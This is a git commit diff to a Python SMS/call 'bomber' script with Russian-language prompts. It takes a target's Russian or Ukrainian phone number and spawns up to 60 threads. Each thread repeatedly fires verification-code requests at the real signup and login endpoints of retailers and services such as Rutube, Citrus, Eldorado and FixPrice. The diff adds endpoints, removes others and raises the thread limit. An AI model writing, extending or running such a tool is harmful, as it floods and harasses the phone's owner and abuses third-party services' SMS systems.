11e7a7147735b9be4c762249fb527481a5406429
NikStor03 <67559040+NikStor03@users.noreply.github.com>
2020-07-11 17:51:16 +0300

    Update b0mb3r.py

--- b0mb3r.py
+++ b0mb3r.py
@@ -3,8 +3,11 @@ import threading
 import json
 from colorama import init
 from termcolor import colored
-from torrequest import TorRequest
-init()
+
+init()# Иницеалезирую цвет(делаю так что б все print были разноцветными)
+
+#-_-_-_-_-_-_-_-_-_-_-_-_Подготовка Номера и всех переменных -_-_-_-_-_-_-_-_-_-_-_-_
+
 print(colored("Введите название страны(РУС, УКР)", "yellow"))
 while True:
 	country = str(input("-----> "))
@@ -23,9 +26,9 @@ while True:
 			phonebuzzolls = f"+38 ({_phone[0:3]}) {_phone[3:6]}-{_phone[6:8]}-{_phone[8:10]}"
 			phonedianet = f"+38 ({_phone[0:3]}) {_phone[3:6]} {_phone[6:8]} {_phone[8:10]}"
 			phoneiQlab = f"+38 ({_phone[0:3]}) {_phone[3:6]} {_phone[6:8]} {_phone[8:10]}"
+			phoneCitrus = f"+380 {_phone[1:3]} {_phone[3:6]} {_phone[6:8]} {_phone[8:10]}"
 			phonevodafone = _phone[1:]
-			print(colored(phonevodafone, "green"))
-			print(colored(phone, "green"))
+			print(colored(phoneCitrus, "green"))
 			break
 		elif country == "рус" and len(str(phone)) == 11:
 			_phone = str(phone)[1:]
@@ -40,7 +43,7 @@ while True:
 	except:
 		print(colored("В номере ошибка", "red"))
 
-print(colored("Во сколько потоков атаковать(максимум столько, сколько у вас ядров на компе):", "yellow"))
+print(colored("Во сколько потоков атаковать(max. 60):", "yellow"))
 while True:
 	try:
 		th = int(input("-----> "))
@@ -51,6 +54,8 @@ phone = str(phone)
 _phone = str(_phone)
 password = ['1gjfgj56', '96fg8072533', '5367493sdg', '232lkgshlg', '6jl09225', '823iom5']
 email = 'email_man_today@mail.ru'
+
+#-_-_-_-_-_-_-_-_-_-_-_-_Основная функция где происходит вся магия(шлет спам)-_-_-_-_-_-_-_-_-_-_-_-_
 
 def loop(password, sleep_time, k, th):
 	sleep_time = float(sleep_time)
@@ -157,83 +162,6 @@ def loop(password, sleep_time, k, th):
 		print(colored("[-] Ошибка", "red"))
 	time.sleep(sleep_time)
 	try:
-		citilink = requests.post(
-				f"https://www.citilink.ru/registration/check/phone/{phone}/")
-		if str(citilink) == "<Response [200]>":
-			print(colored('[+] Citilink отправлено', 'green'))
-		else:
-			print(colored("[-] Citilink НЕотправленно", "red"))
-	except:
-		print(colored("[-] Ошибка", "red"))
-	time.sleep(sleep_time)
-	try:
-		dianet = requests.post(
-			"https://my.dianet.com.ua/send_sms/", 
-			data={"phone": _phone,},
-			headers={
-				"Accept-Language": "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7,uk;q=0.6",
-				"Connection": "keep-alive",
-				"Host": "my.dianet.com.ua",
-				"Origin": "https://my.dianet.com.ua",
-				"Referer": "https://my.dianet.com.ua/login/",
-				
-			}
-		)
-		if str(dianet) == "<Response [200]>":
-			print(colored('[+] Dianet отправлено', 'green'))
-		else:
-			print(colored("[-] Dianet НЕотправленно", "red"))
-	except:
-		print(colored("[-] Ошибка", "red"))
-	time.sleep(sleep_time)
-	try:
-		eldorado = requests.post(
-			f"https://api.eldorado.ua/v1/sign/",
-			params={
-			"login": phone,
-			"step": "phone-check",
-			"fb_id": "null",
-			"fb_token": "null",
-			"lang": "ru"},
-			headers={})
-		if str(eldorado) == "<Response [200]>":
-			print(colored('[+] Eldorado отправлено', 'green'))
-		else:
-			print(colored("[-] Eldorado НЕотправленно", "red"))
-	except:
-		print(colored("[-] Ошибка", "red"))
-	time.sleep(sleep_time)
-	try:
-		fixprice = requests.post(
-			"https://fix-price.ru/ajax/register_phone_code.php",
-			data={"register_call": "Y", "action": "getCode", "phone": "+" + phone},
-		)
-		if str(fixprice) == "<Response [200]>":
-			print(colored('[+] FixPrice отправлено', 'green'))
-		else:
-			print(colored("[-] FixPrice НЕотправленно", "red"))
-	except:
-		print(colored("[-] Ошибка", "red"))
-	time.sleep(sleep_time)
-	try:
-		getmancar = requests.post(
-			"https://crm.getmancar.com.ua/api/veryfyaccount",
-			json={
-				"phone": "+" + phone,
-				"grant_type": "password",
-				"client_id": "gcarAppMob",
-				"client_secret": "SomeRandomCharsAndNumbersMobile",
-			}, 
-			timeout=2
-		)
-		if str(getmancar) == "<Response [200]>":
-			print(colored('[+] Getmancar отправлено', 'green'))
-		else:
-			print(colored("[-] Getmancar НЕотправленно", "red"))
-	except:
-		print(colored("[-] Ошибка", "red"))
-	time.sleep(sleep_time)
-	try:
 		rutube = requests.post(
 			'https://pass.rutube.ru/api/accounts/phone/send-code/',
 			data={
@@ -255,34 +183,44 @@ def loop(password, sleep_time, k, th):
 		print(colored("[-] Ошибка", "red"))
 	time.sleep(sleep_time)
 	try:
-		citrus = requests.get(
-			f"https://my.citrus.ua/hunter/?hcode=b5f7ac4514f7c0a1133fb71ffcc99f1b&phone={phone}",
-			params={"hcode":"b5f7ac4514f7c0a1133fb71ffcc99f1b", 
-					"phone": phone}
+		citrus = requests.post(
+			f"https://my.citrus.ua/api/auth/login",
+			data={"identity": phoneCitrus},
 			)
 		if str(citrus) == "<Response [200]>":
-			print(colored('[+] Сitrus звонок отправлено', 'green'))
+			print(colored('[+] Сitrus отправлено', 'green'))
 		else:
-			print(colored("[-] Сitrus звонок НЕотправленно", "red"))
+			print(colored("[-] Сitrus НЕотправленно", "red"))
 	except:
 		print(colored("[-] Ошибка", "red"))
 	time.sleep(sleep_time)
-	try:
-		mamamia = requests.post(
-			f"https://mamamia.ua/api/auth/login",
-			data={"phone":_phone},
-			headers={
-				"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
-			})
-		if str(mamamia) == "<Response [200]>":
-			print(colored('[+] Mamamia отправлено', 'green'))
-		else:
-			print(colored("[-] Mamamia НЕотправленно", "red"))
-	except:
-		print(colored("[-] Ошибка", "red"))
-	time.sleep(sleep_time)
+	# try:
+	# 	foxtrot = requests.post(
+	# 		f"https://www.foxtrot.com.ua/ru/account/newlogin",
+	# 		data={
+	# 		"__RequestVerificationToken": "wxTmOGaBiVaDwWuGFSYUEegTerhb3fS_c7c4eJB5z1odfkPMfnQNizC9LWw-voPqx5AE4RDIO-ChQzqsCqacgfDVstc1",
+	# 		"GoogleCaptchaToken": "03AGdBq26Z-i7BWDR5Uair2718qg5SIic6SwTTNxV4NCLfHTA93ql_iaX3JBvFb1j16-NccoItITov3kPYfsDuG5RDW5pPWbqSqIOuxlE17_sHyo4UlLrjyQw1QxXb-JopWhzWuwwQbDdopqS8C6eOxLRg_GjIjXFju5SC9GaG_fXPz-mP_tizke2BObB6kE0jsloc4PMw9Zb8r5ReOwnp8TSpiSYWt5i7DU1j2150MQYRZrE7AybDI6vGYeUeb8XYTyMQ3vpgAA2MUt87TmUO1zhBP2uzXYzV1ajnhUq1slNMhbUXIFTxKGAArUpWhw1IOdoGa_eNhqVNOXdogvNsHu8YT0K2dphcgg2cYKX1tMGB2iSEyf0h8ZaEBXbrW2knN1yivjZlU8Ya",
+	# 		"CellPhone": "+38(099) 972 37 55",
+	# 		"X-Requested-With": "XMLHttpRequest"},
+	# 		headers={
+	# 			"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
+	# 		})
+	# 	print(mamamia.text)
+	# 	if str(mamamia) == "<Response [200]>":
+	# 		print(colored('[+] FoxTrot отправлено', 'green'))
+	# 	else:
+	# 		print(colored("[-] FoxTrot НЕотправленно", "red"))
+	# except:
+	# 	print(colored("[-] Ошибка", "red"))
+	# time.sleep(sleep_time)
 
-	print(colored(f"{k}/{th} круг пройден", "yellow"))
+	if th > 60:
+		print(colored(f"{k}/60 круг пройден", "yellow"))
+	else:
+		print(colored(f"{k}/{th} круг пройден", "yellow"))
+
+
+#-_-_-_-_-_-_-_-_-_-_-_-_Поток всех запросов(зауск функции)-_-_-_-_-_-_-_-_-_-_-_-_
 
 #Потоки
 k = 1
@@ -388,6 +326,145 @@ while True:
 		t26 = threading.Thread(target=loop, args=(password, _sleep, k, th))
 		t26.start()
 		_threat = t26
+	if th >= 27:
+		t27 = threading.Thread(target=loop, args=(password, _sleep, k, th))
+		t27.start()
+		_threat = t27
+	if th >= 28:
+		t28 = threading.Thread(target=loop, args=(password, _sleep, k, th))
+		t28.start()
+		_threat = t28
+	if th >= 29:
+		t29 = threading.Thread(target=loop, args=(password, _sleep, k, th))
+		t29.start()
+		_threat = t29
+	if th >= 30:
+		t30 = threading.Thread(target=loop, args=(password, _sleep, k, th))
+		t30.start()
+		_threat = t30
+	if th >= 31:
+		t31 = threading.Thread(target=loop, args=(password, _sleep, k, th))
+		t31.start()
+		_threat = t31
+	if th >= 32:
+		t32 = threading.Thread(target=loop, args=(password, _sleep, k, th))
+		t32.start()
+		_threat = t32
+	if th >= 33:
+		t33 = threading.Thread(target=loop, args=(password, _sleep, k, th))
+		t33.start()
+		_threat = t33
+	if th >= 34:
+		t34 = threading.Thread(target=loop, args=(password, _sleep, k, th))
+		t34.start()
+		_threat = t34
+	if th >= 35:
+		t35 = threading.Thread(target=loop, args=(password, _sleep, k, th))
+		t35.start()
+		_threat = t35
+	if th >= 36:
+		t36 = threading.Thread(target=loop, args=(password, _sleep, k, th))
+		t36.start()
+		_threat = t36
+	if th >= 37:
+		t37 = threading.Thread(target=loop, args=(password, _sleep, k, th))
+		t37.start()
+		_threat = t37
+	if th >= 38:
+		t38 = threading.Thread(target=loop, args=(password, _sleep, k, th))
+		t38.start()
+		_threat = t38
+	if th >= 39:
+		t39 = threading.Thread(target=loop, args=(password, _sleep, k, th))
+		t39.start()
+		_threat = t39
+	if th >= 40:
+		t40 = threading.Thread(target=loop, args=(password, _sleep, k, th))
+		t40.start()
+		_threat = t40
+	if th >= 41:
+		t41 = threading.Thread(target=loop, args=(password, _sleep, k, th))
+		t41.start()
+		_threat = t41
+	if th >= 42:
+		t42 = threading.Thread(target=loop, args=(password, _sleep, k, th))
+		t42.start()
+		_threat = t42
+	if th >= 43:
+		t43 = threading.Thread(target=loop, args=(password, _sleep, k, th))
+		t43.start()
+		_threat = t43
+	if th >= 44:
+		t44 = threading.Thread(target=loop, args=(password, _sleep, k, th))
+		t44.start()
+		_threat = t44
+	if th >= 45:
+		t45 = threading.Thread(target=loop, args=(password, _sleep, k, th))
+		t45.start()
+		_threat = t45
+	if th >= 46:
+		t46 = threading.Thread(target=loop, args=(password, _sleep, k, th))
+		t46.start()
+		_threat = t46
+	if th >= 47:
+		t47 = threading.Thread(target=loop, args=(password, _sleep, k, th))
+		t47.start()
+		_threat = t47
+	if th >= 48:
+		t48 = threading.Thread(target=loop, args=(password, _sleep, k, th))
+		t48.start()
+		_threat = t48
+	if th >= 49:
+		t49 = threading.Thread(target=loop, args=(password, _sleep, k, th))
+		t49.start()
+		_threat = t49
+	if th >= 50:
+		t50 = threading.Thread(target=loop, args=(password, _sleep, k, th))
+		t50.start()
+		_threat = t50
+	if th >= 51:
+		t51 = threading.Thread(target=loop, args=(password, _sleep, k, th))
+		t51.start()
+		_threat = t51
+	if th >= 52:
+		t52 = threading.Thread(target=loop, args=(password, _sleep, k, th))
+		t52.start()
+		_threat = t52
+	if th >= 53:
+		t53 = threading.Thread(target=loop, args=(password, _sleep, k, th))
+		t53.start()
+		_threat = t53
+	if th >= 54:
+		t54 = threading.Thread(target=loop, args=(password, _sleep, k, th))
+		t54.start()
+		_threat = t54
+	if th >= 55:
+		t55 = threading.Thread(target=loop, args=(password, _sleep, k, th))
+		t55.start()
+		_threat = t55
+	if th >= 56:
+		t56 = threading.Thread(target=loop, args=(password, _sleep, k, th))
+		t56.start()
+		_threat = t56
+	if th >= 57:
+		t57 = threading.Thread(target=loop, args=(password, _sleep, k, th))
+		t57.start()
+		_threat = t57
+	_threat.join()
+	if th >= 58:
+		t58 = threading.Thread(target=loop, args=(password, _sleep, k, th))
+		t58.start()
+		_threat = t58
+	_threat.join()
+	if th >= 59:
+		t59 = threading.Thread(target=loop, args=(password, _sleep, k, th))
+		t59.start()
+		_threat = t59
+	_threat.join()
+	if th >= 60:
+		t60 = threading.Thread(target=loop, args=(password, _sleep, k, th))
+		t60.start()
+		_threat = t60
 	_threat.join()
 
 	# if th == k:
@@ -395,12 +472,3 @@ while True:
 	# 	time.sleep(5)
 	# 	exit()
 	k += 1
-# 	t26 = threading.Thread(target=loop, args=(password, _sleep))
-# 	t26.start()
-# 	_threat = t26
-# 	_threat.join()
-# 	i += 1
-	# if th == i:
-	# 	print(colored("Всё готово, ждем реакции ^-^", 'yellow'))
-	# 	time.sleep(5)
-	# 	exit()
